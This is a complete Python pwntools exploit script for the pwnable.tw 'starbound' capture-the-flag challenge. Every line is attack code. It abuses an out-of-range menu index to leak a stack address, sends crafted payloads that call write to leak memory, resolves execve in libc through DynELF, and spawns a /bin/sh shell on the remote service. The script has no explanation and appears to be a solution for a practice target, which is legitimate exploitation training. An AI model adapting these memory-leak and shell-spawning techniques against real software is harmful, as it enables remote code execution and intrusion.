from pwn import *

io = remote('chall.pwnable.tw', 10202)

elf = ELF('./starbound')

def leak_stack_addr():
    puts_index = (elf.got['puts'] - 0x8058154) // 4
    io.recvuntil('> ') 
    io.send(str(puts_index).ljust(0x3c))
    io.recv(0x3c)
    stack_leak = u32(io.recv(4))
    return stack_leak

def leak_addr(addr):
    global buff_addr
    io.recvuntil('> ')
    index = (buff_addr + 0x10 - 0x8058154) // 4
    payload = str(index).encode().ljust(12) + p32(buff_addr + 0x30) + p32(0x804a5fe) + p32(0)
    payload += p32(elf.plt['write']) + p32(0x804a664) + p32(1) + p32(addr) + p32(0x4)
    io.send(payload)
    leak = io.recv(4)
    buff_addr += 0x30 # fix stack
    return leak

def spawn_shell(execve_addr):
    io.recvuntil('> ')
    index = (buff_addr + 0x10 - 0x8058154) // 4
    payload = str(index).encode().ljust(12) + p32(buff_addr + 0x30) + p32(0x804a5fe) + p32(0)
    payload += p32(execve_addr) + p32(0) + p32(0x80580d0) + p32(0) + p32(0)
    io.send(payload)

def cmd_set_name(name):
    io.recvuntil('> ')
    io.send('6')
    io.recvuntil('> ')
    io.send('2')
    io.recvuntil('Enter your name: ')
    io.send(name)
    io.recvuntil('> ')
    io.send('1')

cmd_set_name('/bin/sh\0')
buff_addr = leak_stack_addr() - 0xb8

dynelf = DynELF(leak_addr, elf = elf)
execve_addr = dynelf.lookup('execve', 'libc')

spawn_shell(execve_addr)

io.interactive()
